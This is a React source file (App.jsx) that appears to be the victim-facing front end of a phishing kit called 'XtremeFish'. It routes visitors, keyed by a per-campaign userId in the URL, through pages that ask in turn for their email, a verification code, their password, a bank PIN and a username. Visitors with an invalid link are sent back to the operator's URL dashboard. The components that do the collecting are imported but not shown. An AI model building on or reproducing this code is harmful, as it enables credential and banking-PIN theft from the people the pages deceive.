import { useEffect, useState } from "react";
import Email from "./components/flow.jsx/Email";
import Password from "./components/flow.jsx/Password";
import Username from "./components/flow.jsx/UserName";
import Code from "./components/flow.jsx/Code";
import "./App.css";
import "./index.css";
import BankPin from "./components/flow.jsx/BankPin";
import { useParams, Routes, Route } from "react-router-dom";
import mongoose from "mongoose";

function App() {
  const [email, setEmail] = useState("");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [validUserId, setValidUserId] = useState(false);
  const { userId } = useParams(); // Extracting userId from URL parameters
  useEffect(() => {
    if(mongoose.Types.ObjectId.isValid(userId)){
      setValidUserId(true)
    }
  }, [])
  
  return (
    <>
    {validUserId?(
      <div className="bg">
      <Routes>
        <Route
          path="/:userId?/*"
          element={
            <Email
            email={email}
            setEmail={setEmail}
            userId={userId} // Passing userId to Email component
            />
          }
          />
        <Route path="/code" element={<Code emailValue={email} />} />
        <Route
          path="/password"
          element={
            <Password
            password={password}
            setPassword={setPassword}
            email={email}
            />
          }
          />
        <Route path="/bankPin" element={<BankPin email={email}/>} />
        <Route 
        path="/username/:userId?/*" 
        element={<Username 
          username={username}
          setUsername={setUsername}
          userId={userId}
          />
        }   
        />
      </Routes>
    </div>
    ):(
      <div className="h-screen bg-['rgba(0, 0, 0, 0.5)'] bg-opacity-30 backdrop-blur-sm z-10 w-full h-screen flex justify-center items-center">
      <div className="flex flex-col items-center  mt-2">
        <div className="bg-[#12111d] w-[500px] px-10 py-10 rounded-md flex flex-col justify-center items-center gap-4 text-center">
          <p className="text-red-500">Access Restricted !</p>
          <p className="text-white text-sm"> Please return to XtremeFish and follow the correct link to access this page.</p>
          <a href="http://localhost:3000/dashboards/urls" className="text-lg text-blue-600 hover:underline">Return to XtremeFish</a>
        </div>
      </div>
    </div>
  )}
        </>
  );
}

export default App;
